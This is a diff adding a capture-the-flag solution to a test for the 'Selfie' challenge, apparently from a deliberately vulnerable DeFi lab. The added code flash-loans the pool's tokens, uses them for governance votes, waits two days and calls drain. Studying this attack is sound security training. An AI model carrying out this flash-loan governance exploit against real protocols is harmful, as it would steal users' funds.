@@ -39,6 +39,17 @@ describe('[Challenge] Selfie', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        // Steps:
+        // borrow tokens,
+        // take snapshot,
+        // propose drain,
+        // wait two days,
+        // money
+        let flashRichVoter = await (await ethers.getContractFactory('FlashRichVoter', player)).deploy(token.address, governance.address, pool.address);
+        pool.connect(player).flashLoan(flashRichVoter.address, token.address, TOKENS_IN_POOL, "0x");
+        await time.increase(172801); // 2 days
+        flashRichVoter.drain(1);
+
     });
 
     after(async function () {
